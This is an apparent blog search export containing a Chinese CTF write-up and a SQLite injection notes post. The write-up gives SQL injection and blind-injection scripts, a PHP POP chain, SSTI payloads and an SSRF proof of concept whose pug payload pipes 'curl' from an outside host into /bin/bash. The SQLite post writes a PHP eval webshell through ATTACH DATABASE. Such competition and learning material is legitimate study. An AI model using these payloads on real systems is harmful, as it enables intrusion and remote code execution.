<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>2020新春战役GYCTF writeup</title>
      <link href="/2020/02/24/gyctf2020-writeup/"/>
      <url>/2020/02/24/gyctf2020-writeup/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><strong>新春防疫的ctf公益比赛，有些题目可以在<code>buuoj</code>上面复现</strong></p><p>前两天做了发现差不多全是<code>sql注入</code>，要吐了，第三天的题还可以</p><h2 id="第一天"><a href="#第一天" class="headerlink" title="第一天"></a>第一天</h2><h3 id="简单的招聘"><a href="#简单的招聘" class="headerlink" title="简单的招聘"></a>简单的招聘</h3><p>在注册 登录那里有<code>insert into</code> 注入，<br>注入结果可以在 <code>pages-profile.php</code>看到</p><p><strong>注册页面</strong></p><pre><code>regname=a','1','1')#&amp;regpass=1</code></pre><p>发现成功注册，但是登录失败，盲猜密码经过了md5 加密</p><p>regname=a’,’1’,’1’),(‘12’,’c4ca4238a0b923820dcc509a6f75849b’,(select group_concat(column_name) from information_schema.columns where table_name=’flag’))#&amp;regpass=admin%27%7C%7C%271</p><p>获取列名</p><p>获取flag</p><p>regname=a’,’1’,’1’),(‘12’,’c4ca4238a0b923820dcc509a6f75849b’,(select flaaag from flag))#&amp;regpass=admin%27%7C%7C%271</p><p>数据库情况:</p><pre><code>表名：backup,flag,userflag:id,flaaag</code></pre><h3 id="ezupload"><a href="#ezupload" class="headerlink" title="ezupload"></a>ezupload</h3><p>送分题</p><p>后缀<code>php3</code><br>上传成功在  执行 <code>/readflag</code>获得<code>flag</code></p><h3 id="第三题"><a href="#第三题" class="headerlink" title="第三题"></a>第三题</h3><p>时间盲注，select 没了，提示<code>flag</code>在<code>fl4g</code>中</p><p>用 regexp注入</p><pre><code>import requestsimport timeimport stringurl='http://232047a84d5f4d3684012ab422bff8ae488f8539fdda475c.changame.ichunqiu.com/'def inj(payload):    t1=time.time()    req=requests.get(url,params={'id':payload})    t2=time.time()    print(t2-t1)    if t2-t1&gt;2:        return Trueflag='^'payload='0||if((fl4g regexp "{}"),sleep(2),1)'inj(payload)stri='-qwertyuiopasdfghjklzxcvbnm1234567890{}_='for i in range(50):    for j in stri:        tmp=payload.format(flag+j)        print(tmp)        a=inj(tmp)        if a is True:            flag+=j            print(flag)            break</code></pre><h3 id="babyphp"><a href="#babyphp" class="headerlink" title="babyphp"></a>babyphp</h3><p>这题有点意思</p><ul><li>代码审计</li><li>反序列化字符串逃逸</li><li>pop链</li></ul><p><strong>CtrlCase 可以用反序列化逃逸控制</strong></p><p>然后就可以构造pop链</p><p>然后需要找 <code>__destruct</code> 的方法 利用下去</p><ul><li><p>开始想 用反序列化 update 改admin的密码，但是失败了(本地成功。。</p></li><li><p>inseRt iNto 插入用户名也失败了(本地成功。。</p></li><li><p>后来 select 1,md5(1) from user where username=?</p></li></ul><p>看到有回显 1 ，那就注入密码</p><p><strong>pop 链:</strong></p><pre><code>&lt;?phpclass User{    public $id;    public $age = null;    public $nickname = null;}class Info{    public $age;    public $nickname;    public $CtrlCase;}Class UpdateHelper{    public $id;    public $newinfo;    public $sql;}class dbCtrl{    public $hostname="127.0.0.1";    public $dbuser="noob123";    public $dbpass="noob123";    public $database="noob123";    public $name='c4ca4238a0b923820dcc509a6f75849b';    public $password="1";    public $mysqli;    public $token='admin';}$a=new Info();$b=new UpdateHelper();$c=new User();$d=new Info();$e=new dbCtrl();$d-&gt;CtrlCase=$e;$c-&gt;nickname=$d;#$c-&gt;age='update user SET password=? where 1';$c-&gt;age='select password,md5(1) from user where username=? oR 1';#$c-&gt;age='insErt iNto user (username,password,age,nickname) valueS ("m0on",?,"1","1")';$b-&gt;sql=$c;$a-&gt;CtrlCase=$b;$a-&gt;nickname="1";$las=serialize($a);echo $las."\n";echo strlen($las);</code></pre><p>从 <code>";s:8:"CtrlCase</code> 开始截取</p><p>然后需要反序列化逃逸 ，使用 *和union 来变成hacker逃逸</p><p>用 <code>python</code> 简单处理一下</p><pre><code>a='''";s:8:"CtrlCase";O:12:"UpdateHelper":3:{s:2:"id";N;s:7:"newinfo";N;s:3:"sql";O:4:"User":3:{s:2:"id";N;s:3:"age";s:54:"select password,md5(1) from user where username=? oR 1";s:8:"nickname";O:4:"Info":3:{s:3:"age";N;s:8:"nickname";N;s:8:"CtrlCase";O:6:"dbCtrl":8:{s:8:"hostname";s:9:"127.0.0.1";s:6:"dbuser";s:7:"noob123";s:6:"dbpass";s:7:"noob123";s:8:"database";s:7:"noob123";s:4:"name";s:32:"c4ca4238a0b923820dcc509a6f75849b";s:8:"password";s:1:"1";s:6:"mysqli";N;s:5:"token";s:5:"admin";}}}}}'''b=len(a)c=b//5d=''d+='*'*c+(b-c*5)*'union'+aprint(d)</code></pre><p>构造</p><pre><code>age=1&amp;nickname=***************************************************************************************************";s:8:"CtrlCase";O:12:"UpdateHelper":3:{s:2:"id";N;s:7:"newinfo";N;s:3:"sql";O:4:"User":3:{s:2:"id";N;s:3:"age";s:54:"select password,md5(1) from user where username=? oR 1";s:8:"nickname";O:4:"Info":3:{s:3:"age";N;s:8:"nickname";N;s:8:"CtrlCase";O:6:"dbCtrl":8:{s:8:"hostname";s:9:"127.0.0.1";s:6:"dbuser";s:7:"noob123";s:6:"dbpass";s:7:"noob123";s:8:"database";s:7:"noob123";s:4:"name";s:32:"c4ca4238a0b923820dcc509a6f75849b";s:8:"password";s:1:"1";s:6:"mysqli";N;s:5:"token";s:5:"admin";}}}}}</code></pre><p>md5解密 是yingyingying ，看来应该可以弱口令的吧，没有试。。。。醉了</p><p>然后登录在 update.php得到flag</p><h2 id="第二天"><a href="#第二天" class="headerlink" title="第二天"></a>第二天</h2><h3 id="black-list"><a href="#black-list" class="headerlink" title="black_list"></a>black_list</h3><p>叠堆注入 ， set 不能用 ，那就 用handler </p><p>?inject=2%27-1;show%20tables;handler%20FlagHere%20open%20ad;handler%20ad%20read%20first;</p><pre><code>http://40509bd15cd7405893c4b46c93a1efe7772e15de2f3542b3.changame.ichunqiu.com/?inject=2%27-1;show%20tables;handler%20FlagHere%20open%20ad;handler%20ad%20read%20first;</code></pre><h3 id="easysqli-copy"><a href="#easysqli-copy" class="headerlink" title="easysqli_copy"></a>easysqli_copy</h3><p>pdo 预处理 使用了 <code>gbk</code>编码，导致宽字节注入，</p><p>叠堆 注入 ，</p><p><code>select</code> 不能用 ，用<code>set</code> 来注入</p><p>,然后时间盲注</p><pre><code>import requestsimport timeimport binasciiurl='http://a265f2d3937e403b89a0563c2dd9e88f7de2577c581345ab.changame.ichunqiu.com/?id='def requ(payload):    tmp='1%dd%27;set%20@a=0x{};prepare%20haha%20from%20@a;execute%20haha;'.format(hexpay(payload))    t1=time.time()    req=requests.get(url+tmp)    t2=time.time()    if t2-t1&gt;2:        return Truedef hexpay(payload):    pay=binascii.b2a_hex(payload.encode()).decode()    return paydb='^'for i in range(1,100):    #for j in range(40,130):    for j in '1234567890abcdefABCDEFz':        print(j)        #payload='''select if(ascii(substr(database(),{},1))={},sleep(2),1)'''.format(str(i),str(j))        #payload='''select if(ascii(substr(( select group_concat(table_name) from information_schema.tables where table_schema='pdotest'  ),{},1))={},sleep(2),1)'''.format(str(i),str(j))        #payload='''select if((select hex(group_concat(column_name)) regexp '{}' from information_schema.columns where table_name='table1' ),sleep(2),1)'''.format(db+j)        payload='''select if((select hex(fllllll4g) regexp '{}' from table1 ),sleep(2),1)'''.format(db+j)        #print(payload)        a=requ(payload)        if a is True:            db+=j            print(db)            break        if j=='z':            print('false********8')</code></pre><h3 id="ezsqli"><a href="#ezsqli" class="headerlink" title="ezsqli"></a>ezsqli</h3><p>先是获得 表名 ，</p><p>or 不能用了 ，</p><p>绕过<code>information_schema</code> </p><p><code>innodb</code> 也不能用了</p><p>用<code>sys.schema_table_statistics_with_buffer</code></p><p>然后 列名 无法得到，</p><p>union select 又不能用，版本<code>5.7</code></p><p>那就看官方文档 ，</p><p>看到了 </p><p><a href="https://dev.mysql.com/doc/refman/5.7/en/row-subqueries.html" target="_blank" rel="noopener">https://dev.mysql.com/doc/refman/5.7/en/row-subqueries.html</a></p><p>(column1,column2) = (1,1);</p><p>可以用类似盲注方法 </p><p>(column1,column2) &gt;= (1,1);</p><p>发现 两列的 所以 </p><p><code>where  (1,1)&gt;= (select * from f1ag_1s_h3r3_hhhhh)</code></p><p>，试过几个发现 ， </p><p> <code>where  (1,'a')&gt;= (select * from f1ag_1s_h3r3_hhhhh)</code><br>这样会出错，返回500 ，</p><p>而 第一列 测试发现int型的，</p><p>所以第二列是flag</p><p>所以用 <code>(select 0x61)</code>这样的代表第二列</p><pre><code>import requestsimport timeimport binasciiurl='http://e1feb1a7ba234a06a1669d7949ac16b7c16cbab87af44d76.changame.ichunqiu.com/index.php'def inj(payload):    req=requests.post(url,data={'id':payload})    if 'Hello CQGAME' in req.text:        return Truedb=''for i in range(50):    for j in range(30,130):        #payload='''2-(select hex( ( select database() )) regexp '{}'  )'''.format(db+j)        #payload='''2-(select hex( ( select group_concat(table_name)from sys.schema_table_statistics_with_buffer where table_schema=database() )) regexp '{}'  )'''.format(db+j)        payload='''3-(select 1   where ((select 1),(select {} ))&gt;= (select * from f1ag_1s_h3r3_hhhhh))'''.format('0x'+binascii.b2a_hex(db.encode()).decode()+hex(j).replace('0x',''))        print(payload)        a=inj(payload)        if  a is True:            db+=chr(j-1)            print(db)            break        if j==129:            print('false **********8')</code></pre><p>得到：</p><p>FLAG{2612D538-3A53-4B94-9079-567F7B6EB427|</p><p>只要把 最后一个 | 换成 }</p><p>再全部变成小写就可以了</p><h2 id="第三天"><a href="#第三天" class="headerlink" title="第三天"></a>第三天</h2><h3 id="node-game"><a href="#node-game" class="headerlink" title="node_game"></a>node_game</h3><p><strong>源代码：</strong></p><pre><code>var express = require('express');var app = express();var fs = require('fs');var path = require('path');var http = require('http');var pug = require('pug');var morgan = require('morgan');const multer = require('multer');app.use(multer({dest: './dist'}).array('file'));app.use(morgan('short'));app.use("/uploads",express.static(path.join(__dirname, '/uploads')))app.use("/template",express.static(path.join(__dirname, '/template')))app.get('/', function(req, res) {    var action = req.query.action?req.query.action:"index";    if( action.includes("/") || action.includes("\\") ){        res.send("Errrrr, You have been Blocked");    }    file = path.join(__dirname + '/template/'+ action +'.pug');    var html = pug.renderFile(file);    res.send(html);});app.post('/file_upload', function(req, res){    var ip = req.connection.remoteAddress;    var obj = {        msg: '',    }    if (!ip.includes('127.0.0.1')) {        obj.msg="only admin's ip can use it"        res.send(JSON.stringify(obj));        return     }    fs.readFile(req.files[0].path, function(err, data){        if(err){            obj.msg = 'upload failed';            res.send(JSON.stringify(obj));        }else{            var file_path = '/uploads/' + req.files[0].mimetype +"/";            var file_name = req.files[0].originalname            var dir_file = __dirname + file_path + file_name            if(!fs.existsSync(__dirname + file_path)){                try {                    fs.mkdirSync(__dirname + file_path)                } catch (error) {                    obj.msg = "file type error";                    res.send(JSON.stringify(obj));                    return                }            }            try {                fs.writeFileSync(dir_file,data)                obj = {                    msg: 'upload success',                    filename: file_path + file_name                }             } catch (error) {                obj.msg = 'upload failed';            }            res.send(JSON.stringify(obj));            }    })})app.get('/source', function(req, res) {    res.sendFile(path.join(__dirname + '/template/source.txt'));});app.get('/core', function(req, res) {    var q = req.query.q;    var resp = "";    if (q) {        var url = 'http://localhost:8081/source?' + q        console.log(url)        var trigger = blacklist(url);        if (trigger === true) {            res.send("error occurs!            ");                    } else {                        try {                            http.get(url, function(resp) {                                resp.setEncoding('utf8');                                resp.on('error', function(err) {                                if (err.code === "ECONNRESET") {                                 console.log("Timeout occurs");                                 return;                                }                               });                                resp.on('data', function(chunk) {                                    try {                                     resps = chunk.toString();                                     res.send(resps);                                    }catch (e) {                                       res.send(e.message);                                    }                                }).on('error', (e) =&gt; {                                     res.send(e.message);});                            });                        } catch (error) {                            console.log(error);                        }                    }                } else {                    res.send("search param 'q' missing!");                }            })            function blacklist(url) {                var evilwords = ["global", "process","mainModule","require","root","child_process","exec","\"","'","!"];                var arrayLen = evilwords.length;                for (var i = 0; i &lt; arrayLen; i++) {                    const trigger = url.includes(evilwords[i]);                    if (trigger === true) {                        return true                    }                }            }            var server = app.listen(8081, function() {                var host = server.address().address                var port = server.address().port                console.log("Example app listening at http://%s:%s", host, port)            })</code></pre><p>思路很清晰<br>/file_upload 有一个限制必须 127.0.0.1<br>先 利用node 的cve ，拆分攻击，http.get() 可以 用 unicode 字符，来CRLF和SSRF</p><p>利用SSRF上传个 文件 ，然后用pug 执行命令 </p><p>可惜一直 被 content-length 坑了 ，这个如果不精确 就会让 服务器 堵塞 30秒，到最后只剩下30分钟才发现这个问题。 难怪一直 失败， 比赛结束之后做出来了，</p><p>poc:弹shell</p><pre><code>import urllibimport requestspayload='''dasdas HTTP/1.1Host:127.0.0.1:8081connection:keep-alivePOST /file_upload HTTP/1.1Host: 123.57.212.112:33323User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateReferer: http://123.57.212.112:33323/?action=uploadContent-Type: multipart/form-data; boundary=---------------------------7583695899588870231116957455Content-Length: 404Connection: closeUpgrade-Insecure-Requests: 1-----------------------------7583695899588870231116957455Content-Disposition: form-data; name="file"; filename="ggg.pug"Content-Type: ../../../../../usr/src/app/uploads/-[]["constructor"]["constructor"]("console.log(this.process.mainModule.require('child_process').exec('curl http://mu2766c382.zicp.vip:18430/shell | /bin/bash'))")()-----------------------------7583695899588870231116957455--GET / HTTP/1.1connection:close'''.replace("\r\n","\n")payload=payload.replace("\n","\r\n")print(payload)payload=payload.replace("\r",'\u010D').replace("\n",'\u010a').replace(' ','\u0120').replace('"','\u0122').replace("'",'\u0127').replace('-','\u012d').replace('=','\u013d').replace('/','\u012f')payload=payload.replace('o','\u016f').replace('e','\u0165').replace('|','\u017c').replace('a','\u0161')url='http://182.92.243.154:33322/core?q='req=requests.get(url+urllib.parse.quote(payload))print(req.text)</code></pre><p>这些blacklist 都可以使用 </p><p><code>replace('o','\u016f')</code></p><p><code>replace('e','\u0165')</code> 绕过</p><p>action 那里可以使用 数组绕过 <code>/</code>和 <code>\</code></p><p>然后访问 </p><pre><code>http://182.92.243.154:33322/?action[]=../../../../../../usr/src/app/uploads/ggg</code></pre><p>执行命令 </p><p>cd /</p><p>cat /flag,txt</p><h3 id="flaskapp"><a href="#flaskapp" class="headerlink" title="flaskapp"></a>flaskapp</h3><p>python3.7</p><p>利用 SSTI 读取文件</p><p>然后 debug pin 执行命令</p><p>在 base64 decode 那里 存在SSTI，这个SSTI 执行命令的被禁了，</p><p>读取文件可以使用 </p><p><code>&lt;class 'urllib.request.URLopener'&gt;</code></p><p>这个类</p><p>使用 base64编码的 </p><pre><code>{{session['__class__'].__mro__[11].__subclasses__()}}</code></pre><p>获取 </p><pre><code>csrf_token=ImQ2ZDgzM2Q0NWYzYThjYjVmZWY2NTU3NjNhYzgxNTRhNTNjNTg1ZmUi.XlNFsg.YPgw6WxuZ6-ZC8z0v129Lf1h42g&amp;text=e3tzZXNzaW9uWydfX2NsYXNzX18nXS5fX21yb19fWzExXS5fX3N1YmNsYXNzZXNfXygpfX0= &amp;submit=%E6%8F%90%E4%BA%A4</code></pre><p>然后 读取 pin 需要的文件</p><pre><code>{{session['__class__'].__mro__[11].__subclasses__()[367]().open_file('/sys/class/net/eth0/address').read()}}</code></pre><p>base64 编码</p><p>再读取 <code>/proc/self/cgroup</code> 获取 <code>machine-id</code></p><p>读取 <code>/etc/passwd</code>获取 用户名 <code>flaskweb</code></p><p>脚本:<br><code>machine-id</code> <code>用户名</code>，<code>/sys/class/net/eth0/address</code>要自己获取</p><pre><code>import hashlibfrom itertools import chainprobably_public_bits = [    'flaskweb'# username    'flask.app',# modname    'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__'))    '/usr/local/lib/python3.7/site-packages/flask/app.py' # getattr(mod, '__file__', None),]private_bits = [    '2485377957892',# str(uuid.getnode()),  /sys/class/net/eth0/address    '2760c403a7342785875fee2cf06c775c5d54803fe8436f19ce7b9e83281015c2'# get_machine_id(), /etc/machine-id]h = hashlib.md5()for bit in chain(probably_public_bits, private_bits):    if not bit:        continue    if isinstance(bit, str):        bit = bit.encode('utf-8')    h.update(bit)h.update(b'cookiesalt')cookie_name = '__wzd' + h.hexdigest()[:20]num = Noneif num is None:    h.update(b'pinsalt')    num = ('%09d' % int(h.hexdigest(), 16))[:9]rv =Noneif rv is None:    for group_size in 5, 4, 3:        if len(num) % group_size == 0:            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')                          for x in range(0, len(num), group_size))            break    else:        rv = numprint(rv)</code></pre><h3 id="easythink"><a href="#easythink" class="headerlink" title="easythink"></a>easythink</h3><p>thinkphp6.0的漏洞</p><p>thinkphp6.0 写入shell</p><p>session 如果是 32位 的话， 没有任何过滤就写入 session 文件，thinkphp6的session文件 默认在 <code>runtime</code> 目录下 ，所以 </p><p>构造 32 位 的session 最后四个 是 .php  ，</p><p>然后 就可以写入shell了，</p><p>至于shell的值 要用 $_SESSION[‘’] 这个来构造，很简单</p><p>随便一个用户名 ，用构造的session 登录 ，</p><p>然后 到<code>search</code>页面</p><p>要 <code>search</code> 的历史记录 会记录在session中 ，</p><p>然后就 蚁剑连接</p><p>需要执行 <code>/readflag</code>  才可以 读取flag  ，</p><p>但是有disable_function</p><p>就使用 php-gc 绕过disable_function ，</p><p>平时使用的 exp不行，多找几个类型的 ， 找另外一个 就成功了</p><h3 id="ezexpress"><a href="#ezexpress" class="headerlink" title="ezexpress"></a>ezexpress</h3><ul><li>admin  toLowerCase() 绕过</li><li>原型链污染</li></ul><p>merge() 函数可以原型链污染 opts 对象 outputFunctionName</p><p>做到一半 ，发现 可以上车 ，直接获取flag ，醉了<br>详情看<br><a href="https://evi0s.com/2019/08/30/expresslodashejs-%E4%BB%8E%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%B0rce/" target="_blank" rel="noopener">https://evi0s.com/2019/08/30/expresslodashejs-%E4%BB%8E%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%B0rce/</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> writeup </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqlite</title>
      <link href="/2020/02/14/sqlite/"/>
      <url>/2020/02/14/sqlite/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="sqlite基础"><a href="#sqlite基础" class="headerlink" title="sqlite基础"></a>sqlite基础</h2><p><em>sqlite没有if和sleep语句</em></p><h3 id="sqlite的-是拼接字符串"><a href="#sqlite的-是拼接字符串" class="headerlink" title="sqlite的||是拼接字符串"></a>sqlite的||是拼接字符串</h3><pre class=" language-aidl"><code class="language-aidl">sqlite> select 123||4;1234    </code></pre><h3 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h3><p>–空格</p><p>/* */</p><h3 id="常规"><a href="#常规" class="headerlink" title="常规"></a>常规</h3><p><code>select column1 from table where 1=1 and 2=2</code></p><h3 id="sqlite数据类型"><a href="#sqlite数据类型" class="headerlink" title="sqlite数据类型"></a>sqlite数据类型</h3><ul><li>null</li><li>integer</li><li>real 浮点数</li><li>text 文本字符串 (utf-8,utf-16be或utf-16le 存储)</li><li>BLOB blob根据输入存储</li></ul><h3 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h3><h4 id="创建数据库-sqlite3-test-db"><a href="#创建数据库-sqlite3-test-db" class="headerlink" title="创建数据库: $sqlite3 test.db"></a>创建数据库: <code>$sqlite3 test.db</code></h4><p>会在当前目录创建 test.db</p><pre><code>sqlite&gt; .databases #检查是否在数据库列表main: /root/download/test.db</code></pre><h4 id="ATTACH附加数据库，如果没有则会创建"><a href="#ATTACH附加数据库，如果没有则会创建" class="headerlink" title="ATTACH附加数据库，如果没有则会创建"></a>ATTACH附加数据库，如果没有则会创建</h4><ul><li>可以利用这个来写shell<pre class=" language-aidl"><code class="language-aidl">sqlite> ATTACH DATABASE '/root/download/shell.db' as 'haah';sqlite> .databasemain: /root/download/test.dbhaah: /root/download/shell.db</code></pre></li></ul><h3 id="导出数据"><a href="#导出数据" class="headerlink" title="导出数据"></a>导出数据</h3><pre class=" language-aidl"><code class="language-aidl">sqlite> .dump #显示PRAGMA foreign_keys=OFF;BEGIN TRANSACTION;COMMIT;</code></pre><pre class=" language-aidl"><code class="language-aidl">$sqlite3 testdb.db .dump >123.sql #导出到文件中 </code></pre><h3 id="表"><a href="#表" class="headerlink" title="表"></a>表</h3><h4 id="table"><a href="#table" class="headerlink" title=".table"></a>.table</h4><p>查看表</p><h4 id="insert，select，update和mysql类似"><a href="#insert，select，update和mysql类似" class="headerlink" title="insert，select，update和mysql类似"></a>insert，select，update和mysql类似</h4><h4 id="create-table"><a href="#create-table" class="headerlink" title="create table"></a>create table</h4><pre class=" language-aidl"><code class="language-aidl">CREATE TABLE `vote` (  `id` INTEGER PRIMARY KEY AUTOINCREMENT,  `name` TEXT NOT NULL,  `count` INTEGER);</code></pre><h4 id="insert-table"><a href="#insert-table" class="headerlink" title="insert table"></a>insert table</h4><pre class=" language-aidl"><code class="language-aidl">INSERT INTO `vote` (`name`, `count`) VALUES  ('dog', 0),  ('cat', 0),  ('zebra', 0),  ('koala', 0);</code></pre><h3 id="GLOB-类似like"><a href="#GLOB-类似like" class="headerlink" title="GLOB  类似like"></a>GLOB  类似like</h3><p>GLOB对大小写敏感，而且使用linux的符号 </p><ul><li>*</li></ul><ul><li>?</li></ul><pre><code>sqlite&gt; select * from vote where name GLOB 'do?';id          name        count     ----------  ----------  ----------1           dog         0</code></pre><h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h3><h4 id="abs"><a href="#abs" class="headerlink" title="abs()"></a>abs()</h4><p>如果整数是<code>-9223372036854775808</code>会溢出错误</p><h4 id="coalesce-可以多个参数，返回第一个不是null的参数"><a href="#coalesce-可以多个参数，返回第一个不是null的参数" class="headerlink" title="coalesce()可以多个参数，返回第一个不是null的参数"></a>coalesce()可以多个参数，返回第一个不是null的参数</h4><pre class=" language-cookie"><code class="language-cookie">select coalesce(null,'a','abbbb');coalesce(null,'a','a')----------------------a         </code></pre><pre class=" language-cookie"><code class="language-cookie">select coalesce(nullif(2,2),'hah');coalesce(nullif(2,2),'hah')---------------------------hah              </code></pre><p>相当于 if 2=2 return hah else null</p><h4 id="hex-char"><a href="#hex-char" class="headerlink" title="hex,char"></a>hex,char</h4><h4 id="nullif-和-ifnull"><a href="#nullif-和-ifnull" class="headerlink" title="nullif 和 ifnull"></a>nullif 和 ifnull</h4><ul><li>nullif</li></ul><p>两个参数，nullif(a,b),如果a和b相等返回 null</p><p>如果a和b不想等，返回 a</p><ul><li>ifnull </li></ul><p>和 <code>coalesce()</code>类似，不过只能两个参数，返回第一个非null</p><p>如果都为null，返回null</p><h4 id="instr-a-b"><a href="#instr-a-b" class="headerlink" title="instr(a,b)"></a>instr(a,b)</h4><p>返回<code>b</code>在<code>a</code>出现的位置</p><h4 id="length"><a href="#length" class="headerlink" title="length()"></a>length()</h4><h4 id="lower和-upper"><a href="#lower和-upper" class="headerlink" title="lower和 upper"></a>lower和 upper</h4><h4 id="max-a-b"><a href="#max-a-b" class="headerlink" title="max(a,b)"></a>max(a,b)</h4><h4 id="like-a-b"><a href="#like-a-b" class="headerlink" title="like(a,b)"></a>like(a,b)</h4><p>相当于 <code>b</code> like <code>a</code></p><p>可以用 _ % </p><pre><code>sqlite&gt; select like('ab_','abc');like('ab_','abc')-----------------1          </code></pre><ul><li>like可以有第三个参数，</li></ul><p>相当于like语句的 ESCAPE ，转义</p><p>在 <code>%</code> 或者 <code>_</code> 前面添加什么字符可以把 <code>%</code>或者 <code>_</code>当作字符串</p><p>而不是匹配符号 </p><pre class=" language-cookie"><code class="language-cookie">sqlite> select like('barz_','bar_','z');like('barz_','bar_','z')------------------------1             </code></pre><p>这里把 z 用作 和 \ 类似的作用</p><h4 id="ltrim-a-和-ltrim-a-b"><a href="#ltrim-a-和-ltrim-a-b" class="headerlink" title="ltrim(a) 和 ltrim(a,b)"></a>ltrim(a) 和 ltrim(a,b)</h4><p>删除左侧字符串</p><ul><li>一个参数 返回删除左侧空格的字符串</li><li>两个参数 a,b ，返回删除空格和第二个参数<code>b</code>字符串<pre class=" language-cookie"><code class="language-cookie">sqlite> SELECT ltrim('aaaa bc','a');ltrim('aaaa bc','a')bc</code></pre></li></ul><h4 id="rtrim-a-和-rtrim-a-b-和ltrim类似"><a href="#rtrim-a-和-rtrim-a-b-和ltrim类似" class="headerlink" title="rtrim(a)和 rtrim(a,b) 和ltrim类似"></a>rtrim(a)和 rtrim(a,b) 和ltrim类似</h4><h4 id="trim-就是-rtrim-ltrim"><a href="#trim-就是-rtrim-ltrim" class="headerlink" title="trim 就是 rtrim + ltrim"></a>trim 就是 rtrim + ltrim</h4><h4 id="printf"><a href="#printf" class="headerlink" title="printf()"></a>printf()</h4><p>和普通的 格式化字符串一样 ，</p><pre class=" language-cookie"><code class="language-cookie">sqlite> select printf("aw%s",'sl');printf("aw%s",'sl')awsl</code></pre><h4 id="quote-a"><a href="#quote-a" class="headerlink" title="quote(a)"></a>quote(a)</h4><p>将字符串 带上 ‘ ‘ </p><pre class=" language-cookie"><code class="language-cookie">平常：sqlite> select 1233;1233      ----------1233      quote:sqlite> SELECT quote('1233');quote('1233')-------------'1233'    </code></pre><h4 id="random"><a href="#random" class="headerlink" title="random()"></a>random()</h4><p>返回随机数</p><h4 id="randomblob-a"><a href="#randomblob-a" class="headerlink" title="randomblob(a)"></a>randomblob(a)</h4><p>返回 a个字节的 blob</p><p>如果很长可以造成时间盲注</p><h4 id="replace-a-b-c"><a href="#replace-a-b-c" class="headerlink" title="replace(a,b,c)"></a>replace(a,b,c)</h4><p>把 a中的 b换成c</p><pre class=" language-cookie"><code class="language-cookie">sqlite> select replace('a{ab}','a','b');replace('a{ab}','a','b')------------------------b{bb}            </code></pre><h4 id="soundex"><a href="#soundex" class="headerlink" title="soundex()"></a>soundex()</h4><p>返回字符串的 <code>soundex</code>编码 ，很迷</p><p>开眼界了</p><pre class=" language-cookie"><code class="language-cookie">sqlite> select soundex('a');soundex('a')------------A000       </code></pre><h4 id="sqlite-version-版本"><a href="#sqlite-version-版本" class="headerlink" title="sqlite_version() 版本"></a>sqlite_version() 版本</h4><h4 id="substr-和mysql"><a href="#substr-和mysql" class="headerlink" title="substr() 和mysql"></a>substr() 和mysql</h4><h4 id="typeof"><a href="#typeof" class="headerlink" title="typeof"></a>typeof</h4><p>返回字符串类型</p><h4 id="unicode"><a href="#unicode" class="headerlink" title="unicode()"></a>unicode()</h4><p>返回第一个字符的<code>unicode</code> 数字</p><pre class=" language-cookie"><code class="language-cookie">sqlite> select unicode('a');unicode('a')------------97         sqlite> select unicode('哈');unicode('哈')------------21704     </code></pre><h2 id="注入"><a href="#注入" class="headerlink" title="注入"></a>注入</h2><h3 id="写shell-需要叠堆注入"><a href="#写shell-需要叠堆注入" class="headerlink" title="写shell 需要叠堆注入"></a>写shell 需要叠堆注入</h3><pre class=" language-aidl"><code class="language-aidl">ATTACH DATABASE '/tmp/good.php' as 'm0on';CREATE TABLE m0on.shell_haha(`haha` text);INSERT INTO m0on.shell_haha (haha) VALUES ('<?php eval($_POST[cmd]);?>');</code></pre><p>cat /tmp/good.php</p><pre><code>��A&lt;?php eval($_POST[cmd]);?&gt;</code></pre><h3 id="获取所有表名"><a href="#获取所有表名" class="headerlink" title="获取所有表名"></a>获取所有表名</h3><pre class=" language-cookie"><code class="language-cookie">select name from sqlite_master where type='table';select tbl_name from sqlite_master where type='table';</code></pre><h3 id="获取-表的结构，包括列名"><a href="#获取-表的结构，包括列名" class="headerlink" title="获取 表的结构，包括列名"></a>获取 表的结构，包括列名</h3><pre class=" language-cookie"><code class="language-cookie">select sql from sqlite_master where name='表名';sqlite> select sql from sqlite_master where name='shell';sql                             --------------------------------CREATE TABLE shell(first,second)列名是 first 和 second</code></pre><h3 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h3><h4 id="substr-unicode"><a href="#substr-unicode" class="headerlink" title="substr ,unicode"></a>substr ,unicode</h4><pre class=" language-cookie"><code class="language-cookie">select unicode(substr('abc',1,1));select substr('abc',1,1);</code></pre><p>使用<code>unicode()</code> 类似于 mysql的<code>ascii()</code></p><h4 id="like"><a href="#like" class="headerlink" title="like"></a>like</h4><pre class=" language-cookie"><code class="language-cookie">select like('a%','abc');</code></pre><h4 id="regexp"><a href="#regexp" class="headerlink" title="regexp"></a>regexp</h4><p>需要扩展</p><pre class=" language-cookie"><code class="language-cookie">apt-get install sqlite3-pcre</code></pre><p>或者</p><pre class=" language-cookie"><code 